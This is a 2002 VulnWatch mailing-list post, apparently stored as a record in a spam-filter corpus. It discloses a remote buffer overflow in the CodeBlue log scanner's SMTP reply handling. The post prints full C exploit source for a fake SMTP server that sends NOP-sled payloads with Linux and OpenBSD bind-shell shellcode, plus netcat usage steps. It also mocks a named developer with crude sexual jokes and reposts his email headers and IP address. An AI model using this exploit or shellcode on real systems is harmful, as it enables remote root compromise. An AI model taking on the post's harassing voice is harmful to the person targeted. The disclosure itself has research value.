{"id":"01393","group":"easy-ham-2","checksum":{"type":"MD5","value":"40e9333a57d6f73d1eb2080a6b059848"},"text":"From vulnwatch-return-403-jm=jmason.org@vulnwatch.org  Wed Jul 24 17:47:46 2002\nReturn-Path: <vulnwatch-return-403-yyyy=spamassassin.taint.org@vulnwatch.org>\nDelivered-To: yyyy@localhost.netnoteinc.com\nReceived: from localhost (localhost [127.0.0.1])\n\tby phobos.labs.netnoteinc.com (Postfix) with ESMTP id C2291440A8\n\tfor <jm@localhost>; Wed, 24 Jul 2002 12:47:44 -0400 (EDT)\nReceived: from dogma.slashnull.org [212.17.35.15]\n\tby localhost with IMAP (fetchmail-5.9.0)\n\tfor jm@localhost (single-drop); Wed, 24 Jul 2002 17:47:44 +0100 (IST)\nReceived: from vikki.vulnwatch.org ([199.233.98.101]) by\n    dogma.slashnull.org (8.11.6/8.11.6) with SMTP id g6OGeB426692 for\n    <jm@jmason.org>; Wed, 24 Jul 2002 17:40:11 +0100\nReceived: (qmail 21358 invoked by alias); 24 Jul 2002 16:58:04 -0000\nMailing-List: contact vulnwatch-help@vulnwatch.org; run by ezmlm\nPrecedence: bulk\nList-Post: <mailto:vulnwatch@vulnwatch.org>\nList-Help: <mailto:vulnwatch-help@vulnwatch.org>\nList-Unsubscribe: <mailto:vulnwatch-unsubscribe@vulnwatch.org>\nList-Subscribe: <mailto:vulnwatch-subscribe@vulnwatch.org>\nDelivered-To: mailing list vulnwatch@vulnwatch.org\nDelivered-To: moderator for vulnwatch@vulnwatch.org\nReceived: (qmail 25020 invoked from network); 24 Jul 2002 16:48:34 -0000\nDate: Thu, 25 Jul 2002 02:05:00 +1000 (EST)\nFrom: Demi Sex God from Hell <doe@orbital.wiretapped.net>\nTo: vulnwatch@vulnwatch.org\nMessage-Id: <Pine.BSO.4.44.0207250203290.28334-100000@orbital.wiretapped.net>\nMIME-Version: 1.0\nContent-Type: TEXT/PLAIN; charset=US-ASCII\nSubject: [VulnWatch] Remote hole in Codeblue log scanner\n\nTITLE: Potential remote root in CodeBlue log scanner\nNAME: DEMI SEX GOD FROM HELL ADV 00001\nDATE: YES, PLEASE MAIL ME IF YOU ARE FEMALE (send pictures)\nCRAZY TRACKING NUMBER THAT MAKES IT LOOK LIKE I HAVE SOME MASSIVE DATABASE OF\nJUAREZ: 7363A64B02\n\nProps to dme@#!\n\nInformation\n-----------\n\nyou may remember me from sweaty nights of passion, or perhaps from yesterday when\ni announced the release of a piece of software i wrote (many years ago too\nbtw).\n\nin general i received no feedback from this, cept from one guy having problems\ndownloading it (howd that go btw?) and then this:\n\nFrom: \"Michael\"\nTo: \"'Demi Sex God from Hell'\"\nSubject: RE: ass the attack spoofing shell\n\nAnnoying. Pointless.\n\nwell! how very very rude. that really was uncalled for. (propz to dme yo!).\ngay, bi or curious, i went to find out more about mystical michael, who is\nobviously very important as he is the only one who felt the need to tell me\nthey didnt like me. it turns out, hes a bit of programmer, with some code\navailable on his website (www.tenebrous.com). I got codeblue, (btw mystical\nmike your auto-download script for you counter gives me a 500 error), a log\nchecking utility mystical mike wrote and released under the GNU GPL to make\nthe world a better place.\n\nIf this tool is run as root (say nightly from roots crontab) there is a\npotential remote root. in any case, regardless of user, there is\nalways a remote. if codeblue is locally suid, theres many overflows all\nthroughout it, easy peasy like the girls in st patricks!!!.\n\nNote st patricks is a great place in sydney, playground of the rich and\nfamous. visit it if you ever visit sydney, tell them i sent you.\n\nso lets have a walk through the code, and get a feel for mystical mike, the\nman behind the mystic. (do you wear a crazy robe with a hood like a monk\nmike?)\n\n$ cd codeblue\n$ ls\nCHANGES     COPYING     Makefile    README      codeblue.c\n$ head COPYING\n                    GNU GENERAL PUBLIC LICENSE\n                       Version 2, June 1991\n\n Copyright (C) 1989, 1991 Free Software Foundation, Inc.\n     59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n/* uh-oh */\n\n$ vi codeblue.c\n/*\n * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01\n * root Exp root $\n *\n ******************************************************************************************\n *                      -[ G O D  B L E S S  A M E R I C A ]-\n *\n ******************************************************************************************\n *\n *            CodeBlue v5.0 by Michael (mystic@tenebrous.com)\n *  This software is freely distributable under the terms of the GNU/GPL.\n *                    Please see file 'COPYING'\n\n/* god bless america, AND mystical mike! */\n\n....\n\n/* line ~273 */\n/*\n * siginal_init:\n * sets up all the signals we'd like\n * to handle specially\n */\nvoid signal_init(void)\n{\n    struct sigaction sa_old, sa_new;\n\n    /* signal handling */\n    sa_new.sa_handler = signal_handler;\n    sigemptyset(&sa_new.sa_mask);\n    sa_new.sa_flags = 0;\n    sigaction(SIGINT, &sa_new, &sa_old);\n    sigaction(SIGPIPE, &sa_new, &sa_old);\n}\n\n/* shared signal handler doing all sorts of stuff, not very good mike :( */\n\n/* line ~289 */\n\n/*********************************************************************\n * Our close() wrapper\n */\nint Close(int sd)\n{\n    return (close(sd));\n}\n\n/* that just made me laugh */\n\n/* line ~661 */\n\nchar logline[512]; /* logline is global */\n\nint scan_file(FILE * fp)\n{\n    char buffer[1024];\n\n....\n\n        fgets(buffer, 1024, fp);\n\n....\n\n        if (found_infected == 1) { /* if it picks up a worm entry in the */\n\t\t\t\t   /* log this is true */\n\n            strcpy(logline, buffer);\n\n\t    /* oh dear */\n\n/* line ~827 */\n\nchar reply[512]; /* global */\nchar whoispath[512] = \"/usr/bin/whois\"; /* global */\n\nint main(int argc, char **argv)\n{\n\n \t.....\n\n            if (argv[i][0] == '-')\n                switch (argv[i][1]) {\n                case 'e':{      /* return email address */\n                        if ((!argv[i + 1]) || (argv[i + 1][0] == '-'))\n                            DieWithRequire(argv[i]);\n                        strcpy(reply, argv[i + 1]);\n                        break;\n                    }\n                case 'p':{      /* path to whois binary */\n                        if ((!argv[i + 1]) || (argv[i + 1][0] == '-'))\n                            DieWithRequire(argv[i]);\n                        strcpy(whoispath, argv[i + 1]);\n                        break;\n                    }\n\n\t/* whoops! */\n\n\nNow, all this is good for a laugh, but unless its suid, not much use :(\n\nCodeBlue will scan apache/squid logfiles looking for code red and nimda log\nhits. If it finds a hit, it will connect to the source ip adress of the hit\nand send an email warning of infection. Unfortunately, mystical mike was too\nfar up on his high horse to write something decent.\n\nThe function that does this is send_email() (line ~552)\n\nIt starts off like this:\n\nint send_email(void)\n{\n\tint sd;\n\tchar *host = malloc(sizeof(char) * 512);\n\n/*  .... silly crap using popen and stuff .... */\n\n\t/* host is the infected host from the logfiles\n \t * this will connect to the host on port 25\n\t */\n\n    if ((sd = smtp_connect(host)) < SUCCESS)\n        return -1;\n\n/* Step 0 - Get initial server response */\n    get_smtp_reply(sd);\n\n/* this is the function of interest */\n\n/* line ~345 */\n/*********************************************************************\n * fetches a reply from the SMTP server\n */\nint get_smtp_reply(int sd)\n{\n    char response[1024]; /* this is the remote host's mail server buf */\n\n\t....\n\n\n    /*\n     * We'll loop infinately, receiving\n     * 1 byte at a time until we receive a carriage return\n     * or line-feed character, signifying the end of the output\n     */\n\t/* GEE! THAT SOUNDS LIKE A GOOD IDEA MYSTICAL MIKE#@!#@! */\n\n\t....\n\n    while (TRUE) {\n        if (select((sd + 1), &rset, NULL, NULL, &tv) < 0) {\n            if (errno != EINPROGRESS) {\n                fprintf(stderr, \"[ ERROR: select() failed: %s\\n\",\n                        strerror(errno));\n                return -1;\n            }\n        }\n        if (recv(sd, (int *) &response[i], 1, RECV_FL) < 0) { /* Hello */\n            if (errno == EAGAIN) {\n                if (elapsed >= smtp_timeout) {\n                    fprintf(stderr, \"[ ERROR: operation timed out\\n\");\n                    fprintf(log, \"..... ERROR: operation timed out\\n\");\n                    return -1;\n                }\n                elapsed++;\n                usleep(smtp_timeout * 10000);\n                continue;\n            } else {\n                if (!(flags & FL_BEQUIET))\n                    fprintf(stderr, \"[ ERROR: recv() failed: %s\\n\",\n                            strerror(errno));\n                fprintf(log, \"..... ERROR: recv() failed: %s\\n\",\n                        strerror(errno));\n                return -1;\n            }\n        }\n        if ((response[i] == '\\n')\n            || ((response[i] == '\\n') && (response[i + 1] == '\\n')))\n            break;\n        i++; /* come here often baby? */\n    }\n\nSo slowly but surely, response is overrun, unless it its a newline.\n\n\n/*\n * hi, this is an exploit that doesnt work. it should be enough of a point in\n * the right direction though. the overflow is in get_smtp_reply(), codeblue.c\n * is pretty damn poor, there are more!!!\n *\n * being in a funny mood one afternoon, i made some software publicly\n * available, the next morning i see this in my mailbox:\n *\n * ------- begin spouting off  ------\n * From mystic@tenebrous.com Mon Jul 22 19:50:46 2002\n * Return-Path:\n * Delivered-To: doe@orbital.wiretapped.net\n * Received: (qmail 2711 invoked from network); 22 Jul 2002 19:50:45 -0000\n * Received: from mail110.mail.bellsouth.net (HELO imf10bis.bellsouth.net)\n * (205.152.58.50)\n *  by orbital.wiretapped.net with SMTP; 22 Jul 2002 19:50:45 -0000\n * Received: from Michaels ([68.16.174.6]) by imf10bis.bellsouth.net\n *         (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with ESMTP\n *         id <20020722195143.XJOI21884.imf10bis.bellsouth.net@Michaels>\n *         for ; Mon, 22 Jul 2002 15:51:43 -0400\n * From: \"Michael\"\n * To: \"'Demi Sex God from Hell'\"\n * Subject: RE: ass the attack spoofing shell\n * Date: Mon, 22 Jul 2002 15:50:13 -0400\n * Message-ID: <000101c231b8$fedc7740$0200a8c0@Michaels>\n * MIME-Version: 1.0\n * Content-Type: text/plain;\n *\tcharset=\"us-ascii\"\n * Content-Transfer-Encoding: 7bit\n * X-Priority: 3 (Normal)\n * X-MSMail-Priority: Normal\n * X-Mailer: Microsoft Outlook, Build 10.0.2616\n * Importance: Normal\n * X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000\n * In-Reply-To:\n * Status: RO\n *\n * Annoying. Pointless.\n *\n * ------- end spouting off -------\n *\n * HOW RUDE!@##@!@#!\n *\n * so i had a visit to www.tenebrous.com, found some software written by this\n * master coder, and here we are now.\n *\n * To use this against a webserver (A) using codeblue.\n *\n * $ printf \"GET /scripts/root.exe\\r\\n\\r\\n\" | nc A 80\n *\n * this will add an entry in the access log.\n *\n * ON THE SAME HOST:\n *\n * # ./mystic_anus 25\n *\n * wait a while.\n *\n * when codeblue runs it will pull your ip from the logs, connect to your port\n * 25 and try to send you a mail. because mystic is an idiot, you will get a\n * shell with the openbsd code!!!\n *\n * i like exclamation marks !!!!\n *\n * krad haxxor props: dedmunk (happy now#@!!#@) ph1ll1p, caddis, buo, solace,\n * everyone on #cw , everyone in paris (you have a lovely city, i had a lovely\n * time last weekend, thankyou!!!) dedmunk, everyone at netcraft (esp Mike,\n * hi!), everyone in sydney, dedmunk, everyone i go drinking with, anyone who\n * lives in london, marlinspike (yo!), the woman who sells me my cigarettes in\n * the morning on the way into work, thomas greene, dedmunk, adam, durab, sh00ter.\n *\n * BIG SHOUT OUT TO TOLIMAN AND ZERO SUM, UNDERSTAND!!\n *\n * propz to dme#!@#!@\n *\n * dont forget:\n *\n * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01 root Exp root $\n *\n ******************************************************************************************\n *                      -[ G O D  B L E S S  A M E R I C A ]-                             *\n ******************************************************************************************\n *\n */\n\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n\n#define OF 2048 /* this is bigger than needed */\n\n/* Optimized the code, now it works better in bad situations */\n/* i dont know who wrote this, sorry, if you wrote it, let me know */\n\nchar lunix_shellcode[]=\n\"\\x89\\xe5\\x31\\xd2\\xb2\\x66\\x89\\xd0\\x31\\xc9\\x89\\xcb\\x43\\x89\\x5d\\xf8\"\n\"\\x43\\x89\\x5d\\xf4\\x4b\\x89\\x4d\\xfc\\x8d\\x4d\\xf4\\xcd\\x80\\x31\\xc9\\x89\"\n\"\\x45\\xf4\\x43\\x66\\x89\\x5d\\xec\\x66\\xc7\\x45\\xee\\x0f\\x27\\x89\\x4d\\xf0\"\n\"\\x8d\\x45\\xec\\x89\\x45\\xf8\\xc6\\x45\\xfc\\x10\\x89\\xd0\\x8d\\x4d\\xf4\\xcd\"\n\"\\x80\\x89\\xd0\\x43\\x43\\xcd\\x80\\x89\\xd0\\x43\\xcd\\x80\\x89\\xc3\\x31\\xc9\"\n\"\\xb2\\x3f\\x89\\xd0\\xcd\\x80\\x89\\xd0\\x41\\xcd\\x80\\xeb\\x18\\x5e\\x89\\x75\"\n\"\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x45\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4d\\x08\"\n\"\\x8d\\x55\\x0c\\xcd\\x80\\xe8\\xe3\\xff\\xff\\xff/bin/sh\";\n\n\n/*\n shell on port 6969/tcp shellcode for OpenBSD by noir\n*/\n\nlong bsd_shellcode[]=\n{\n  0x4151c931,0x51514151,0x61b0c031,0x078980cd,\n  0x4f88c931,0x0547c604,0x084f8902,0x0647c766,\n  0x106a391b,0x5004478d,0x5050078b,0x68b0c031,\n  0x016a80cd,0x5050078b,0x6ab0c031,0xc93180cd,\n  0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,\n  0x50078b51,0xb0c03150,0x4180cd5a,0x7503f983,\n  0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,\n  0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,\n  0x01b0c031,0xd8e880cd,0x2fffffff,0x2f6e6962,\n  0x90416873\n};\n\nint main(int argc, char *argv[])\n{\n\tstruct \tsockaddr_in sock_in;\n\tstruct \tsockaddr_in sock_out;\n\tchar \t*port = \"25\";\n\tint \tfd, a;\n\tint \tlen;\n\tint\t\topt;\n\tchar bigbuf[OF];\n\tchar *p;\n\tlong lunix_resp = 0xbfffe0ac;\n\tlong bsd_resp = 0xdfbfc068;\n\tchar *moo = \"220 \";\n\n\tlong resp = lunix_resp;\n\tchar *shellcode = lunix_shellcode;\n\n\tprintf(\"strlen scode = %d\\n\", strlen(shellcode));\n\tif (argc == 2)\n\t\tport = argv[1];\n\n\tif (argc > 2) {\n\t\tfprintf(stderr, \"usege: %s [port]\\n\", argv[0]);\n\t\texit(1);\n\t}\n\n\tresp += 8;\n\n\tp = bigbuf;\n\tmemcpy(p, moo, 4);\n\tp += 4;\n\tmemset(p, '\\x90', 1020 - strlen(shellcode));\n\tp += 1020 - strlen(shellcode);\n\tmemcpy(p, shellcode, strlen(shellcode));\n\tp += strlen(shellcode);\n\tmemcpy(p, &resp, 4);\n\tp += 4;\n\tmemcpy(p, &resp, 4);\n\tp += 4;\n\tmemset(p, '\\n', 4);\n\n\tif ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0){\n\t\tperror(\"socket\");\n\t\texit(1);\n\t}\n\n\tmemset(&sock_in, 0, sizeof(sock_in));\n\tsock_in.sin_family = AF_INET;\n\tsock_in.sin_port = htons(atoi(port));\n\tsock_in.sin_addr.s_addr = INADDR_ANY;\n\tlen = sizeof(sock_in);\n\n\topt = 1;\n\tif (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) == -1) {\n\t\t\tperror(\"setsockopt\");\n\t\t\texit(1);\n\t}\n\n\tif (bind(fd, (struct sockaddr *)&sock_in, len) < 0) {\n\t\tperror(\"bind\");\n\t\texit(1);\n\t}\n\n\tif (listen(fd, 5) < 0) {\n\t\tperror(\"listen\");\n\t\texit(1);\n\t}\n\n\tprintf(\"listening on port %d\\n\", atoi(port));\n\n\tfor (;;) {\n\t\tlen = sizeof(sock_out);\n\t\tif ((a = accept(fd, (struct sockaddr *)&sock_out, &len)) < 0){\n\t\t\tperror(\"accept\");\n\t\t\texit(1);\n\t\t}\n\t\tprintf(\"got a connection from %s\\n\", inet_ntoa(sock_out.sin_addr));\n\t\tfflush(stdout);\n\n\t\twrite(a, bigbuf, sizeof(bigbuf));\n\t\tclose(a);\n\t}\n\n\treturn(1);\n\n}\n\n\n"}